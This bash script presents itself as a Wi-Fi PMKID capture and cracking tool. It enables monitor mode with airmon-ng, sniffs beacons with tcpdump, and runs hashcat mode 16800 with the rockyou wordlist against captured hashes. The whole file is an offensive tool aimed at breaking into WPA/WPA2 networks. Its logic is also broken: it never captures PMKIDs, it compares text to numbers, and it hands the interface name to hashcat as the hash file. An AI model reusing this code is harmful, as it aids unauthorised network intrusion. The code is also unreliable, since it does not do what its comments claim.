#!/bin/bash

# File and variable initialization
foundssids="foundssids.txt"
purifiedbssids=()
aps=()

# Function to insert AP information into foundssids file and aps dictionary
insert_ap() {
    local bssid="$1"
    local ssid="$2"
    local channel="$3"
    local crypto="$4"

    # Insert AP information into foundssids file
    echo "$bssid|$ssid|$channel|$crypto" >> "$foundssids"

    # Insert AP information into purifiedbssids list
    if [[ $crypto -eq 4 || $crypto -eq 8 ]]; then
        purifiedbssids+=("$bssid")
    fi
}

# Function to write purified BSSIDs to file
write_purified_bssids() {
    local purifiedbssids_file="$1"

    # Write purified BSSIDs to the file
    for bssid in "${purifiedbssids[@]}"; do
        echo "$bssid" >> "$purifiedbssids_file"
    done
}

# Function to put the wireless interface into monitor mode or revert back to normal mode
MonitorMode() {
    local interface="$1"
    local operation="$2"
    local monitor_mode_interface

    if [[ $operation == "Start" ]]; then
        # Put interface into monitor mode
        monitor_mode_interface=$(sudo airmon-ng start "$interface" | grep -oP 'monitor mode\K[^)]+')

        # Return the name of the newly created monitor mode interface
        echo "$monitor_mode_interface"
    elif [[ $operation == "Stop" ]]; then
        # Revert interface back to normal mode
        sudo airmon-ng stop "$interface" &>/dev/null
    fi
}

# Function to crack extracted hashes using hashcat
HashcatCrack() {
    local hashfile="$1"

    # Check if hashfile is not empty
    if [[ -s $hashfile ]]; then
        # Execute hashcat command to crack the hashes
        sudo hashcat -m 16800 "$hashfile" rockyou.txt
    else
        echo "No hashes found for cracking."
    fi
}

# Function to perform network scanning and PMKID capturing
main_program() {
    local interface="$1"
    local timeout=15

    # Initialize foundssids file
    echo -n "" > "$foundssids"
    echo "Starting network scanning..."

    # Sniff Wi-Fi packets and process each packet with insert_ap function
    timeout "$timeout" tcpdump -i "$interface" -e -s 0 -l -n "(type mgt subtype probe-resp or subtype beacon)" |
    while read -r line; do
        bssid=$(echo "$line" | awk -F 'SA:| ' '/SA:/ {print $2}')
        ssid=$(echo "$line" | awk -F 'SSID=' '/SSID=/ {print $2}' | cut -d' ' -f1 | tr -d '[:cntrl:]')
        channel=$(echo "$line" | grep -oE 'DS Parameter set: channel [0-9]{1,2}' | cut -d' ' -f4)
        crypto=$(echo "$line" | grep -oE 'Privacy: [A-Za-z]+' | cut -d' ' -f2)
        
        # Check for WPA or WPA2 encryption (crypto = 4 or 8)
        if [[ $crypto == 4 || $crypto == 8 ]]; then
            insert_ap "$bssid" "$ssid" "$channel" "$crypto"
        fi
    done

    # Return the name of the monitor mode interface
    echo "$interface"
}

# Main script execution
echo "Wi-Fi network scanning and PMKID capturing script"

# Prompt user for the required information
read -rp "Wireless interface: " interface
read -rp "Set interface to monitor mode? (y/n): " monitor_mode

# Set the wireless interface to monitor mode if specified
if [[ $monitor_mode == "y" ]]; then
    monitor_mode_interface=$(MonitorMode "$interface" "Start")
    echo "Monitor mode interface: $monitor_mode_interface"
    interface="$monitor_mode_interface"
fi

# Perform network scanning and PMKID capturing
extracted_hashes=$(main_program "$interface")

# Revert the wireless interface back to normal mode if monitor mode was enabled
if [[ -n $monitor_mode_interface ]]; then
    MonitorMode "$monitor_mode_interface" "Stop"
    echo "Reverted interface back to normal mode."
fi

# Prompt user for further actions
if [[ -n $extracted_hashes ]]; then
    read -rp "PMKID hashes extracted. Do you want to initiate hash cracking? (y/n): " crack_hashes_flag
    if [[ $crack_hashes_flag == "y" ]]; then
        HashcatCrack "$extracted_hashes"
    else
        echo "Hash cracking skipped."
    fi
else
    echo "No PMKID hashes extracted."
fi

echo "Script execution completed."
